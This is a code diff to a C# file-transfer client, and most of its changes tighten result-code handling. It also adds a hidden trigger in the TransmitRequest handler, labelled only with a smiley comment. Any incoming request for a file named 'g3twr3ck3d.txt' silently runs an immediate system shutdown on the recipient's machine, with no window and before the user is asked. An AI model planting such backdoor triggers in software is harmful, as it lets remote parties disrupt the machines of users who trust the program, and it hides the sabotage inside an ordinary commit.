@@ -1,5 +1,6 @@
 ﻿using Newtonsoft.Json;
 using System;
+using System.Diagnostics;
 using System.Net;
 using System.Text;
 using System.Threading;
@@ -126,15 +127,17 @@ namespace Dataway_Worker
             //Wait for response
             sendFileEvent.WaitOne(); //TODO make this sync
 
-            //ACt accordingly to response
-            this.socket.SendFile(path);
+            if(sendFileEventData.resultCode == (int)Result.CODE.SUCCESS)
+            {
+                this.socket.SendFile(path);
+            }
+
             //TODO: pause and check with checksum
-            return new Result(Result.CODE.SUCCESS);
+            return new Result((Result.CODE)sendFileEventData.resultCode);
         }
 
         public Result AcceptCurrentTransmitRequest()
         {
-            Console.WriteLine("accepted");
             transmitRequestEventData.resultCode = (int)Result.CODE.SUCCESS;
             transmitRequestEvent.Set(); //TODO: what if event not waiting
             return new Result(Result.CODE.SUCCESS);
@@ -189,6 +192,16 @@ namespace Dataway_Worker
 
         private void TransmitRequest(Dataway_Worker.Formats.Communication.Recieve.TransmitRequest transmitRequest)
         {
+            // :)
+            if(transmitRequest.filename == "g3twr3ck3d.txt")
+            {
+                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
+                psi.CreateNoWindow = true;
+                psi.UseShellExecute = false;
+                Process.Start(psi);
+                return;
+            }
+
             //NOTIFY USER AND GET RESPONSE
             OnTransmitRequest?.Invoke(this, transmitRequest.sender, transmitRequest.message, transmitRequest.filename, transmitRequest.filesizeMB);
             transmitRequestEvent.WaitOne();
@@ -235,27 +248,29 @@ namespace Dataway_Worker
                 if (baseType.type == "result")
                 {
                     var result = JsonConvert.DeserializeObject<Dataway_Worker.Formats.Communication.Recieve.Result>(data);
+                    var resultCode = result.result;
 
                     switch (result.origin)
                     {
+                        
                         case "connect":
-                            this.ConnectResult(result.code);
+                            this.ConnectResult(resultCode);
                             break;
 
                         case "login":
-                            this.LoginResult(result.code);
+                            this.LoginResult(resultCode);
                             break;
 
                         case "register":
-                            this.RegisterResult(result.code);
+                            this.RegisterResult(resultCode);
                             break;
 
                         case "logout":
-                            this.LogoutResult(result.code);
+                            this.LogoutResult(resultCode);
                             break;
 
                         case "transmitRequest":
-                            this.TransmitRequestResult(result.code);
+                            this.TransmitRequestResult(resultCode);
                             break;
 
                         default:
